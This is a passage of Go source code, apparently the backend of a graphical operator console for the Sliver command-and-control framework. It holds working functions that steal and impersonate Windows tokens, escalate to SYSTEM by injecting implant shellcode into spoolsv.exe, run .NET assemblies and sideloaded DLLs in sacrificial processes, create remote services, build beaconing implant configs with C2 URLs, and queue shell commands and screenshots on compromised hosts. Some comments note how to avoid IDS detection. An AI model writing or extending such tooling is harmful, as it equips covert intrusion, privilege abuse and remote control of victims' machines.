	// stream -> local conn
	go func() {
		for {
			td, err := stream.Recv()
			if err != nil {
				conn.Close()
				return
			}
			if len(td.Data) > 0 {
				if _, werr := conn.Write(td.Data); werr != nil {
					return
				}
			}
			if td.Closed {
				conn.Close()
				return
			}
		}
	}()

	// local conn -> stream
	buf := make([]byte, 4096)
	for {
		n, rerr := conn.Read(buf)
		if n > 0 {
			if serr := stream.Send(&sliverpb.TunnelData{
				TunnelID: tunnelID,
				Data:     append([]byte(nil), buf[:n]...),
				Sequence: seq,
			}); serr != nil {
				break
			}
			seq++
		}
		if rerr != nil {
			break
		}
	}
	_ = stream.Send(&sliverpb.TunnelData{TunnelID: tunnelID, Closed: true, Sequence: seq})
	_ = stream.CloseSend()
	_, _ = client.RPC.CloseTunnel(ctx, &sliverpb.Tunnel{TunnelID: tunnelID, SessionID: sessionID})
}

// ─── Token / Privilege (Windows) ───────────────────────────────────────────────

func (a *App) CurrentTokenOwner(sessionID string) (string, error) {
	client, err := a.requireClient()
	if err != nil {
		return "", err
	}
	resp, err := client.RPC.CurrentTokenOwner(a.ctx, &sliverpb.CurrentTokenOwnerReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return "", err
	}
	return resp.Output, nil
}

// MakeToken creates a new logon session token from credentials (logon type 9 =
// NEW_CREDENTIALS, the sliver default).
func (a *App) MakeToken(sessionID, username, domain, password string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.MakeToken(a.ctx, &sliverpb.MakeTokenReq{
		Username:  username,
		Domain:    domain,
		Password:  password,
		LogonType: 9,
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) ImpersonateUser(sessionID, username string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.Impersonate(a.ctx, &sliverpb.ImpersonateReq{
		Username: username,
		Request:  &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RevToSelf(sessionID string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RevToSelf(a.ctx, &sliverpb.RevToSelfReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// GetSystem migrates into a SYSTEM-owned process by spawning implant shellcode.
// It needs an implant config, which we pull from a saved implant profile.
func (a *App) GetSystem(sessionID, hostingProcess, profileName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	cfg, err := a.profileConfig(profileName)
	if err != nil {
		return err
	}
	if hostingProcess == "" {
		hostingProcess = "spoolsv.exe"
	}
	_, err = client.RPC.GetSystem(a.ctx, &clientpb.GetSystemReq{
		HostingProcess: hostingProcess,
		Config:         cfg,
		Request:        &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Assembly / Shellcode Execution ─────────────────────────────────────────────

type AssemblyResult struct {
	Output string `json:"output"`
	Error  string `json:"error,omitempty"`
}

// ExecuteAssembly runs a .NET assembly in-memory. Opens a native file picker for
// the assembly bytes.
// readLocalOrDialog reads a local file on the operator machine. If localPath is
// empty it opens a native file-open dialog instead. Lets console commands pass
// an explicit path (execute-assembly <path>) or fall back to a picker.
func (a *App) readLocalOrDialog(localPath, title string) ([]byte, error) {
	if localPath == "" {
		p, err := a.safeOpenFileDialog(runtime.OpenDialogOptions{Title: title})
		if err != nil || p == "" {
			return nil, fmt.Errorf("selection cancelled")
		}
		localPath = p
	}
	data, err := os.ReadFile(localPath)
	if err != nil {
		return nil, fmt.Errorf("read local file: %w", err)
	}
	return data, nil
}

func (a *App) ExecuteAssembly(sessionID, localPath, args string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select .NET assembly (.exe)")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	resp, err := client.RPC.ExecuteAssembly(a.ctx, &sliverpb.ExecuteAssemblyReq{
		Assembly:  data,
		Arguments: strings.Fields(args),
		Process:   "notepad.exe",
		Request:   &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: string(resp.Output)}
}

// Sideload loads and runs a shared library / DLL in a sacrificial process.
func (a *App) Sideload(sessionID, localPath, args, entryPoint string) AssemblyResult {
	client, err := a.requireClient()
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	data, err := a.readLocalOrDialog(localPath, "Select DLL / shared library to sideload")
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	resp, err := client.RPC.Sideload(a.ctx, &sliverpb.SideloadReq{
		Data:        data,
		Args:        strings.Fields(args),
		EntryPoint:  entryPoint,
		ProcessName: "notepad.exe",
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return AssemblyResult{Error: err.Error()}
	}
	return AssemblyResult{Output: resp.Result}
}

// ─── Service Management (Windows) ───────────────────────────────────────────────

type ServiceView struct {
	Name        string `json:"name"`
	DisplayName string `json:"displayName"`
	Status      string `json:"status"`
	StartupType string `json:"startupType"`
	BinPath     string `json:"binPath"`
	Account     string `json:"account"`
	Description string `json:"description"`
}

// serviceStatusLabel maps a Windows SERVICE_STATUS code to a readable label.
func serviceStatusLabel(code uint32) string {
	switch code {
	case 1:
		return "Stopped"
	case 2:
		return "StartPending"
	case 3:
		return "StopPending"
	case 4:
		return "Running"
	case 5:
		return "ContinuePending"
	case 6:
		return "PausePending"
	case 7:
		return "Paused"
	default:
		return fmt.Sprintf("Unknown(%d)", code)
	}
}

// serviceStartupLabel maps a Windows service start-type code to a label.
func serviceStartupLabel(code uint32) string {
	switch code {
	case 0:
		return "Boot"
	case 1:
		return "System"
	case 2:
		return "Automatic"
	case 3:
		return "Manual"
	case 4:
		return "Disabled"
	default:
		return ""
	}
}

func serviceView(d *sliverpb.ServiceDetails) ServiceView {
	if d == nil {
		return ServiceView{}
	}
	return ServiceView{
		Name:        d.Name,
		DisplayName: d.DisplayName,
		Description: d.Description,
		Status:      serviceStatusLabel(d.Status),
		StartupType: serviceStartupLabel(d.StartupType),
		BinPath:     d.BinPath,
		Account:     d.Account,
	}
}

// ListServices enumerates Windows services on the target via the native
// `Services` RPC. hostname may be "" for the local host.
func (a *App) ListServices(sessionID string) ([]ServiceView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.Services(a.ctx, &sliverpb.ServicesReq{
		Request: &commonpb.Request{SessionID: sessionID},
	})
	if err != nil {
		return nil, err
	}
	if resp.Error != "" {
		return nil, fmt.Errorf("%s", resp.Error)
	}
	out := make([]ServiceView, 0, len(resp.Details))
	for _, d := range resp.Details {
		out = append(out, serviceView(d))
	}
	return out, nil
}

// parseCSVLine parses a single simple RFC-4180-ish CSV row (double-quoted fields).
func parseCSVLine(line string) []string {
	var fields []string
	var sb strings.Builder
	inQuotes := false
	for i := 0; i < len(line); i++ {
		c := line[i]
		switch {
		case c == '"':
			if inQuotes && i+1 < len(line) && line[i+1] == '"' {
				sb.WriteByte('"')
				i++
			} else {
				inQuotes = !inQuotes
			}
		case c == ',' && !inQuotes:
			fields = append(fields, sb.String())
			sb.Reset()
		default:
			sb.WriteByte(c)
		}
	}
	fields = append(fields, sb.String())
	return fields
}

func (a *App) StartService(sessionID, hostname, serviceName, binPath string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StartService(a.ctx, &sliverpb.StartServiceReq{
		ServiceName: serviceName,
		BinPath:     binPath,
		Hostname:    hostname,
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) StopService(sessionID, hostname, serviceName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.StopService(a.ctx, &sliverpb.StopServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: serviceName, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

func (a *App) RemoveService(sessionID, hostname, serviceName string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.RemoveService(a.ctx, &sliverpb.RemoveServiceReq{
		ServiceInfo: &sliverpb.ServiceInfoReq{ServiceName: serviceName, Hostname: hostname},
		Request:     &commonpb.Request{SessionID: sessionID},
	})
	return err
}

// ─── Implant Profiles ───────────────────────────────────────────────────────────

type ProfileView struct {
	Name     string `json:"name"`
	GOOS     string `json:"goos"`
	GOARCH   string `json:"goarch"`
	Format   string `json:"format"`
	C2URL    string `json:"c2Url"`
	Debug    bool   `json:"debug"`
	Beacon   bool   `json:"beacon"`
	Interval int64  `json:"interval"`
	Jitter   int64  `json:"jitter"`
}

func (a *App) ListImplantProfiles() ([]ProfileView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.ImplantProfiles(a.ctx, &commonpb.Empty{})
	if err != nil {
		return nil, err
	}
	out := make([]ProfileView, 0, len(resp.Profiles))
	for _, p := range resp.Profiles {
		v := ProfileView{Name: p.Name}
		if p.Config != nil {
			v.GOOS = p.Config.GOOS
			v.GOARCH = p.Config.GOARCH
			v.Format = p.Config.Format.String()
			v.Debug = p.Config.Debug
			v.Beacon = p.Config.IsBeacon
			v.Interval = p.Config.BeaconInterval / int64(time.Second)
			v.Jitter = p.Config.BeaconJitter / int64(time.Second)
			if len(p.Config.C2) > 0 {
				v.C2URL = p.Config.C2[0].URL
			}
		}
		out = append(out, v)
	}
	return out, nil
}

// SaveImplantProfile persists a new implant profile (reuses the Generate form's
// request shape).
func (a *App) SaveImplantProfile(req GenerateRequest) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	if strings.TrimSpace(req.Name) == "" {
		return fmt.Errorf("profile name is required")
	}
	if strings.TrimSpace(req.C2URL) == "" {
		return fmt.Errorf("a C2 URL is required")
	}
	cfg := a.buildImplantConfig(req)
	_, err = client.RPC.SaveImplantProfile(a.ctx, &clientpb.ImplantProfile{
		Name:   req.Name,
		Config: cfg,
	})
	return err
}

// buildImplantConfig turns a GenerateRequest into a complete ImplantConfig with
// the correct output format, transport Include* flags derived from the C2 URL
// scheme, a valid HTTP C2 profile name, and beacon settings. Shared by
// GenerateImplant and SaveImplantProfile so profiles and builds stay consistent.
func (a *App) buildImplantConfig(req GenerateRequest) *clientpb.ImplantConfig {
	cfg := &clientpb.ImplantConfig{
		GOOS:             req.GOOS,
		GOARCH:           req.GOARCH,
		Debug:            req.Debug,
		Format:           formatFromString(req.Format),
		C2:               []*clientpb.ImplantC2{{URL: req.C2URL, Priority: 1}},
		ObfuscateSymbols: false,
		// Sensible defaults borrowed from the stock Sliver `generate` command.
		// Leaving these at zero produces implants that reconnect with no
		// backoff after any transport dropout - a tight retry loop that
		// hammers the C2, floods logs, and paints a bright IDS signature.
		// Long-poll HTTP requests also close immediately if PollTimeout=0.
		ReconnectInterval:   60 * int64(time.Second),
		PollTimeout:         360 * int64(time.Second),
		MaxConnectionErrors: 1000,
		// MTLS is always compiled in as a baseline transport. The generated
		// implant's transports/session.go imports net/url, sync and sliverpb which
		// only the MTLS/HTTP transports use; an implant that ends up with none of
		// those (e.g. a TCP/named-pipe pivot, or any config where the scheme flag
		// doesn't survive to the teamserver) fails to compile with "exit status 1"
		// on those unused imports. Keeping MTLS on guarantees a buildable implant;
		// the C2 list drives what is actually dialed, so nothing extra connects.
		IncludeMTLS: true,
	}
	if req.Beacon {
		cfg.IsBeacon = true
		interval := req.Interval
		if interval <= 0 {
			interval = 60
		}
		cfg.BeaconInterval = interval * int64(time.Second)
		cfg.BeaconJitter = req.Jitter * int64(time.Second)
	}
	// Prefer the operator's chosen HTTP C2 profile; else fall back to whatever
	// the teamserver has (first profile, or "default"). The chosen profile is
	// what controls the URIs, headers (e.g. X-Request-ID), and user-agents baked
	// into HTTP(S) implants - critical when a redirector gates on a header.
	switch {
	case strings.TrimSpace(req.HTTPC2Profile) != "":
		cfg.HTTPC2ConfigName = strings.TrimSpace(req.HTTPC2Profile)
	default:
		if hc2, _ := a.firstHTTPC2ProfileName(); hc2 != "" {
			cfg.HTTPC2ConfigName = hc2
		} else {
			cfg.HTTPC2ConfigName = "default"
		}
	}
	switch strings.ToLower(schemeOf(req.C2URL)) {
	case "http", "https":
		cfg.IncludeHTTP = true
	case "dns":
		cfg.IncludeDNS = true
	case "wg", "wireguard":
		cfg.IncludeWG = true
	case "tcp", "tcp-pivot", "tcppivot":
		// TCP pivot implants (Sliver scheme "tcp-pivot://") ride the TCP transport.
		// Also compile in MTLS: a pivot-ONLY implant leaves the generated
		// transports/session.go with unused imports (net/url, sync, sliverpb) and
		// fails to build with "exit status 1". Including the MTLS transport keeps
		// those imports used; the C2 list still holds only the pivot URL, so
		// nothing else is ever dialed.
		cfg.IncludeTCP = true
		cfg.IncludeMTLS = true
	case "namedpipe", "named-pipe":
		cfg.IncludeNamePipe = true
		cfg.IncludeMTLS = true
	default:
		cfg.IncludeMTLS = true
	}
	if req.GOOS != "windows" && cfg.Format == clientpb.OutputFormat_SERVICE {
		cfg.Format = clientpb.OutputFormat_EXECUTABLE
	}
	return cfg
}

func (a *App) DeleteImplantProfile(name string) error {
	client, err := a.requireClient()
	if err != nil {
		return err
	}
	_, err = client.RPC.DeleteImplantProfile(a.ctx, &clientpb.DeleteReq{Name: name})
	return err
}


// ─── Beacon Task Execution ───────────────────────────────────────────────────
//
// Beacons use a task-queue model: commands are enqueued and the implant picks
// them up on its next check-in. Results come back asynchronously. We poll for
// task completion with a timeout.

type BeaconTaskResult struct {
	TaskID  string `json:"taskId"`
	Status  string `json:"status"` // "pending", "completed", "error"
	Stdout  string `json:"stdout"`
	Stderr  string `json:"stderr"`
	Error   string `json:"error,omitempty"`
	CmdType string `json:"cmdType,omitempty"`
}

// ExecuteBeaconCommand queues a shell command on a beacon and polls for the result.
func (a *App) ExecuteBeaconCommand(beaconID, command string) BeaconTaskResult {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	// Determine OS for shell path selection.
	beacons, _ := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	var beaconOS string
	if beacons != nil {
		for _, b := range beacons.Beacons {
			if b.ID == beaconID {
				beaconOS = strings.ToLower(b.OS)
				break
			}
		}
	}

	var exePath string
	var args []string
	if strings.Contains(beaconOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}

	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	// For beacon mode, the Execute RPC returns immediately with a task ID in
	// resp.Response. We need to poll for the task result.
	if resp.Response != nil && resp.Response.TaskID != "" {
		taskID := resp.Response.TaskID
		return a.pollBeaconTask(beaconID, taskID)
	}

	// If the response came back directly (shouldn't happen for beacons, but handle it)
	return BeaconTaskResult{
		Status: "completed",
		Stdout: string(resp.Stdout),
		Stderr: string(resp.Stderr),
	}
}

// pollBeaconTask waits for a beacon task to complete, polling every 2 seconds up to 5 minutes.
func (a *App) pollBeaconTask(beaconID, taskID string) BeaconTaskResult {
	if taskID == "" {
		return BeaconTaskResult{Status: "pending", TaskID: "", Error: "task queued - will execute on next beacon check-in"}
	}

	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: "disconnected while waiting"}
	}

	// Poll for up to 5 minutes (beacon intervals can be long)
	deadline := time.Now().Add(5 * time.Minute)
	for time.Now().Before(deadline) {
		tasks, err := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
		if err != nil {
			return BeaconTaskResult{TaskID: taskID, Status: "pending", Error: fmt.Sprintf("poll error: %v - task still queued", err)}
		}
		for _, t := range tasks.Tasks {
			if t.ID == taskID {
				if t.State == "completed" {
					// Try to unmarshal the response as an Execute response
					stdout, stderr := parseExecuteResponse(t.Response)
					return BeaconTaskResult{
						TaskID: taskID,
						Status: "completed",
						Stdout: stdout,
						Stderr: stderr,
					}
				}
				if t.State == "failed" || t.State == "canceled" {
					return BeaconTaskResult{
						TaskID: taskID,
						Status: "error",
						Error:  fmt.Sprintf("task %s", t.State),
					}
				}
			}
		}
		time.Sleep(2 * time.Second)
	}

	return BeaconTaskResult{
		TaskID: taskID,
		Status: "pending",
		Error:  "task still pending - beacon has not checked in yet. It will execute on the next check-in.",
	}
}

// parseExecuteResponse tries to extract stdout/stderr from a serialized Execute
// protobuf response. Falls back to raw string if parsing fails.
func parseExecuteResponse(data []byte) (stdout, stderr string) {
	if len(data) == 0 {
		return "(no output)", ""
	}
	// Try protobuf unmarshal using proto.Unmarshal
	var execResp sliverpb.Execute
	if err := proto.Unmarshal(data, &execResp); err == nil {
		return string(execResp.Stdout), string(execResp.Stderr)
	}
	// Fallback: return raw bytes as string
	return string(data), ""
}

// ExecuteBeaconCommandAsync queues a command on a beacon and polls for the result
// with a configurable timeout. This is the primary method the frontend uses.
// It polls every 2s for up to 5 minutes waiting for the beacon to check in.
func (a *App) ExecuteBeaconCommandAsync(beaconID, command string) BeaconTaskResult {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	beacons, _ := client.RPC.GetBeacons(a.ctx, &commonpb.Empty{})
	var beaconOS string
	if beacons != nil {
		for _, b := range beacons.Beacons {
			if b.ID == beaconID {
				beaconOS = strings.ToLower(b.OS)
				break
			}
		}
	}

	var exePath string
	var args []string
	if strings.Contains(beaconOS, "windows") {
		exePath = "cmd.exe"
		args = []string{"/c", command}
	} else {
		exePath = "/bin/sh"
		args = []string{"-c", command}
	}

	resp, err := client.RPC.Execute(a.ctx, &sliverpb.ExecuteReq{
		Path:    exePath,
		Args:    args,
		Output:  true,
		Request: &commonpb.Request{BeaconID: beaconID, Async: true},
	})
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}

	taskID := ""
	if resp.Response != nil {
		taskID = resp.Response.TaskID
	}

	if taskID == "" && (resp.Stdout != nil || resp.Stderr != nil) {
		return BeaconTaskResult{
			Status: "completed",
			Stdout: string(resp.Stdout),
			Stderr: string(resp.Stderr),
		}
	}

	if taskID == "" {
		tasks, terr := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
		if terr == nil && tasks != nil && len(tasks.Tasks) > 0 {
			newest := tasks.Tasks[0]
			for _, t := range tasks.Tasks[1:] {
				if t.CreatedAt > newest.CreatedAt {
					newest = t
				}
			}
			if newest.State == "pending" || newest.State == "" {
				taskID = newest.ID
			}
		}
	}

	return BeaconTaskResult{Status: "pending", TaskID: taskID}
}

// GetBeaconTaskResults retrieves all task results for a beacon.
type BeaconTaskView struct {
	ID          string `json:"id"`
	State       string `json:"state"`
	Description string `json:"description"`
	CreatedAt   string `json:"createdAt"`
	CompletedAt string `json:"completedAt"`
	Response    string `json:"response"`
}

func (a *App) GetBeaconTasks(beaconID string) ([]BeaconTaskView, error) {
	client, err := a.requireClient()
	if err != nil {
		return nil, err
	}
	resp, err := client.RPC.GetBeaconTasks(a.ctx, &clientpb.Beacon{ID: beaconID})
	if err != nil {
		return nil, err
	}
	out := make([]BeaconTaskView, 0, len(resp.Tasks))
	for _, t := range resp.Tasks {
		created := ""
		if t.CreatedAt > 0 {
			created = time.Unix(t.CreatedAt, 0).Format("15:04:05")
		}
		completed := ""
		if t.CompletedAt > 0 {
			completed = time.Unix(t.CompletedAt, 0).Format("15:04:05")
		}
		// Parse the response bytes into readable text
		response := ""
		if len(t.Response) > 0 && t.State == "completed" {
			stdout, stderr := parseExecuteResponse(t.Response)
			response = stdout
			if stderr != "" {
				response += "\n[stderr] " + stderr
			}
		} else if len(t.Response) > 0 {
			response = string(t.Response)
		}
		out = append(out, BeaconTaskView{
			ID:          t.ID,
			State:       t.State,
			Description: t.Description,
			CreatedAt:   created,
			CompletedAt: completed,
			Response:    response,
		})
	}
	return out, nil
}

// GetBeaconTaskResult fetches a single beacon task's full content. GetBeaconTasks
// only returns task summaries (no Response body) - the actual output requires the
// GetBeaconTaskContent RPC. The frontend poller calls this to display results.
func (a *App) GetBeaconTaskResult(taskID string) (BeaconTaskView, error) {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskView{}, err
	}
	t, err := client.RPC.GetBeaconTaskContent(a.ctx, &clientpb.BeaconTask{ID: taskID})
	if err != nil {
		return BeaconTaskView{}, err
	}
	v := BeaconTaskView{ID: t.ID, State: t.State, Description: t.Description}
	if t.CreatedAt > 0 {
		v.CreatedAt = time.Unix(t.CreatedAt, 0).Format("15:04:05")
	}
	if t.CompletedAt > 0 {
		v.CompletedAt = time.Unix(t.CompletedAt, 0).Format("15:04:05")
	}
	if len(t.Response) > 0 {
		stdout, stderr := parseExecuteResponse(t.Response)
		v.Response = stdout
		if stderr != "" {
			v.Response += "\n[stderr] " + stderr
		}
	}
	return v, nil
}

// BeaconNativeCommand dispatches a command to its native gRPC RPC instead of
// wrapping it in cmd.exe /c via Execute. This is critical for beacons running
// inside hollowed processes where shell execution hangs.
func (a *App) BeaconNativeCommand(beaconID, command, argsStr string) BeaconTaskResult {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskResult{Error: err.Error()}
	}
	// Timeout in NANOSECONDS - this is the task's server-side timeout,
	// NOT the gRPC deadline. Sliver's default is 60s. Without this the
	// beacon may execute the handler but drop the response.
	req := &commonpb.Request{
		BeaconID: beaconID,
		Async:    true,
		Timeout:  int64(60 * time.Second),
	}
	var taskID string

	switch command {
	case "whoami":
		resp, err := client.RPC.CurrentTokenOwner(a.ctx, &sliverpb.CurrentTokenOwnerReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "ps":
		resp, err := client.RPC.Ps(a.ctx, &sliverpb.PsReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "pwd":
		resp, err := client.RPC.Pwd(a.ctx, &sliverpb.PwdReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "cd":
		path := strings.TrimSpace(argsStr)
		if path == "" {
			return BeaconTaskResult{Error: "usage: cd <path>"}
		}
		resp, err := client.RPC.Cd(a.ctx, &sliverpb.CdReq{Path: path, Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "ls":
		path := strings.TrimSpace(argsStr)
		if path == "" {
			path = "."
		}
		resp, err := client.RPC.Ls(a.ctx, &sliverpb.LsReq{Path: path, Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "netstat":
		resp, err := client.RPC.Netstat(a.ctx, &sliverpb.NetstatReq{
			TCP: true, UDP: true, IP4: true, IP6: true, Listening: true,
			Request: req,
		})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "env":
		resp, err := client.RPC.GetEnv(a.ctx, &sliverpb.EnvReq{Name: "", Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "ifconfig":
		resp, err := client.RPC.Ifconfig(a.ctx, &sliverpb.IfconfigReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "screenshot":
		resp, err := client.RPC.Screenshot(a.ctx, &sliverpb.ScreenshotReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "kill", "terminate":
		pid, perr := strconv.Atoi(strings.TrimSpace(argsStr))
		if perr != nil {
			return BeaconTaskResult{Error: "usage: kill <pid>"}
		}
		resp, err := client.RPC.Terminate(a.ctx, &sliverpb.TerminateReq{
			Pid: int32(pid), Force: false, Request: req,
		})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "rev2self":
		resp, err := client.RPC.RevToSelf(a.ctx, &sliverpb.RevToSelfReq{Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "make-token":
		parts := strings.SplitN(strings.TrimSpace(argsStr), " ", 3)
		if len(parts) < 3 {
			return BeaconTaskResult{Error: "usage: make-token <domain> <username> <password>"}
		}
		resp, err := client.RPC.MakeToken(a.ctx, &sliverpb.MakeTokenReq{
			Domain: parts[0], Username: parts[1], Password: parts[2],
			LogonType: 9, Request: req,
		})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "impersonate":
		username := strings.TrimSpace(argsStr)
		if username == "" {
			return BeaconTaskResult{Error: "usage: impersonate <user>"}
		}
		resp, err := client.RPC.Impersonate(a.ctx, &sliverpb.ImpersonateReq{
			Username: username, Request: req,
		})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	case "mkdir":
		path := strings.TrimSpace(argsStr)
		if path == "" {
			return BeaconTaskResult{Error: "usage: mkdir <path>"}
		}
		resp, err := client.RPC.Mkdir(a.ctx, &sliverpb.MkdirReq{Path: path, Request: req})
		if err != nil {
			return BeaconTaskResult{Error: err.Error()}
		}
		if resp.Response != nil {
			taskID = resp.Response.TaskID
		}

	default:
		return BeaconTaskResult{Error: "not a native command: " + command}
	}

	if taskID == "" {
		return BeaconTaskResult{Error: "RPC returned no task ID for " + command}
	}
	return BeaconTaskResult{Status: "pending", TaskID: taskID, CmdType: command}
}

// GetBeaconNativeResult fetches a beacon task's content and parses the response
// bytes according to the original command type. Returns human-readable output.
//
// Sliver has a task-state inconsistency: GetBeaconTasks (summary) reports
// "completed" as soon as the beacon ACKs receipt, but GetBeaconTaskContent
// (full body) still shows state="sent" and 0 response bytes until the beacon
// actually finishes and delivers the payload on a subsequent check-in.
// We poll here for up to 90 seconds waiting for the real completion.
func (a *App) GetBeaconNativeResult(taskID, cmdType string) (BeaconTaskView, error) {
	client, err := a.requireClient()
	if err != nil {
		return BeaconTaskView{}, err
	}

	var t *clientpb.BeaconTask
	deadline := time.Now().Add(90 * time.Second)
	pollInterval := 2 * time.Second
	for {
		t, err = client.RPC.GetBeaconTaskContent(a.ctx, &clientpb.BeaconTask{ID: taskID})
		if err != nil {
			return BeaconTaskView{}, err
		}
		stateLower := strings.ToLower(t.State)
		trulyDone := (strings.Contains(stateLower, "complete") || stateLower == "done") && len(t.Response) > 0
		hardFail := strings.Contains(stateLower, "fail") || strings.Contains(stateLower, "cancel")
		if trulyDone || hardFail {
			break
		}
		if time.Now().After(deadline) {
			break
		}
		time.Sleep(pollInterval)
	}

	v := BeaconTaskView{ID: t.ID, State: t.State, Description: t.Description}
	if t.CreatedAt > 0 {
		v.CreatedAt = time.Unix(t.CreatedAt, 0).Format("15:04:05")
	}
	if t.CompletedAt > 0 {
		v.CompletedAt = time.Unix(t.CompletedAt, 0).Format("15:04:05")
	}
	if len(t.Response) > 0 {
		v.Response = formatNativeResponse(t.Response, cmdType)
	} else {
		v.Response = fmt.Sprintf("[diagnostic] task %s state=%q cmdType=%s response=0 bytes description=%q\n"+
			"[hint] Native RPC returned no data. Try `shell %s` as fallback - that goes through cmd.exe /c\n"+
			"and tests whether the transport works at all. If shell also empty, the beacon can pick up tasks\n"+
			"but responses cannot flow back (likely tunnel/network problem, not command-specific).",
			t.ID[:8], t.State, cmdType, t.Description, cmdType)
	}
	return v, nil
}

// BeaconShellFallback dispatches a command via cmd.exe /c on the beacon.
// Used when the frontend wants to explicitly bypass native RPCs and test
// whether the transport layer works at all. Returns the same task ID format
// so the existing polling infrastructure can pick up the result.
func (a *App) BeaconShellFallback(beaconID, command string) BeaconTaskResult {
	r := a.ExecuteBeaconCommandAsync(beaconID, command)
	r.CmdType = "shell-fallback"
	return r
}

func formatNativeResponse(data []byte, cmdType string) string {
	// Helper: check commonpb.Response for RPC-level errors
	checkErr := func(r *commonpb.Response) string {
		if r != nil && r.Err != "" {
			return "[error] " + r.Err
		}
		return ""
	}

	switch cmdType {
	case "whoami":
		var resp sliverpb.CurrentTokenOwner
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			if resp.Output != "" {
				return resp.Output
			}
		}
		// Field 2 (Output/string) aligns with Execute.Stdout (bytes) - try fallback
		stdout, _ := parseExecuteResponse(data)
		if s := strings.TrimSpace(stdout); s != "" && s != "(no output)" {
			return s
		}

	case "ps":
		var resp sliverpb.Ps
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			var out strings.Builder
			out.WriteString("PID     PPID    OWNER                EXECUTABLE\n")
			for _, p := range resp.Processes {
				owner := p.Owner
				if len(owner) > 20 {
					owner = owner[:20]
				}
				out.WriteString(fmt.Sprintf("%-8d%-8d%-21s%s\n", p.Pid, p.Ppid, owner, p.Executable))
			}
			return out.String()
		}

	case "pwd", "cd":
		var resp sliverpb.Pwd
		if err := proto.Unmarshal(data, &resp); err == nil {
			if e := checkErr(resp.Response); e != "" {
				return e
			}
			if resp.Path != "" {
				return resp.Path
			}
		}

	case "ls":
